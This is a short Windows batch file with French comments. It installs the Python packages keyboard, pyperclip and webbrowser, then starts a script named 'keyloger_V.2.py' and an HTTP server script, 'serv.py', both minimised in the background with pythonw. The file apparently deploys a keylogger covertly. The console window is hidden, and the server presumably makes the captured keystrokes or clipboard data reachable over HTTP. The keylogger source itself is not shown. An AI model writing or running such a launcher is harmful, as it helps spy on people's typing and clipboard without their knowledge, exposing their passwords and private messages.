@echo off

REM Installation du module keyboard via pip
pip install keyboard
pip install webbrowser
pip install pyperclip


REM Efface l'écran
cls

REM Définit le répertoire de travail actuel sur celui où se trouve le script Python
cd /d "%~dp0"

REM Démarrage du script Python en arrière-plan
start /min pythonw keyloger_V.2.py

REM Attendez quelques secondes pour que le script Python démarre
timeout /t 5

REM Démarrage du serveur HTTP en arrière-plan à partir d'un autre fichier batch
start /min pythonw serv.py